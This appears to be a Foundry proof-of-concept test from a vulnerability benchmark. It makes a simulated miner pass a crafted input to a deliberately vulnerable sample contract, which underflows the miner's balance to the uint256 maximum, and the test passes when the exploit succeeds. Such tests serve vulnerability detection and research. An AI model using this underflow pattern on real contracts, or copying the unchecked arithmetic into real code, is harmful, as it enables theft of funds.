// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../src/integer_overflow_minimal.sol";

contract IntegerOverflowTest is Test {
    IntegerOverflowMinimal public target;
    address public miner;
    address public user;
    
    function setUp() public {
        target = new IntegerOverflowMinimal();
        miner = makeAddr("miner");
        user = makeAddr("user");
        
        vm.prank(address(this));
        target.resetCount();
    }

    function test_MinerFrontRunUnderflow() public {
        vm.prank(address(this));
        target.run(0);
        uint256 countBefore = target.getUserBalance(address(this));
        
        console.log("--- BEFORE-Trigger MinerRun ---");
        uint256 pre_miner_balance = target.getUserBalance(miner);
        uint256 pre_total_ops = target.totalOperations();
        console.log("Pre Miner Balance: ", pre_miner_balance);
        console.log("Pre Total Operations: ", pre_total_ops);
        console.log("");
        
        uint256 maliciousInput = countBefore + 1;
        console.log("--- Trigger MinerRun with input: ", maliciousInput, " ---");
        
        vm.prank(miner);
        target.run(maliciousInput);
        
        console.log("--- AFTER-Trigger MinerRun ---");
        uint256 post_miner_balance = target.getUserBalance(miner);
        uint256 post_total_ops = target.totalOperations();
        console.log("Post Miner Balance: ", post_miner_balance);
        console.log("Post Total Operations: ", post_total_ops);
        console.log("");
        
        console.log("--- Comparison Verdict ---");
        bool minerBalanceValid = (post_miner_balance == type(uint256).max);
        bool totalOpsValid = (post_total_ops == pre_total_ops + 1);
        bool vulnerabilityExists = minerBalanceValid && totalOpsValid;
        
        console.log("1. Miner balance overflowed to max? %s", minerBalanceValid ? "YES" : "NO");
        console.log("2. Total operations increased by one? %s", totalOpsValid ? "YES" : "NO");
        
        if (vulnerabilityExists) {
            console.log("[Vulnerability Exists] Miner caused integer underflow setting balance to max");
        } else {
            if (!minerBalanceValid) console.log("Vulnerability not Exist: Miner balance failed to overflow");
            if (!totalOpsValid) console.log("Vulnerability not Exist: Operation counter inconsistency");
        }
        
        // Handle test outcome based on vulnerability existence
        if (vulnerabilityExists) {
            // Only log success without forcing failure
            console.log("TEST PASS: Vulnerability successfully exploited");
        } else {
            fail("TEST FAIL: Vulnerability was not exploited");
        }
    }
}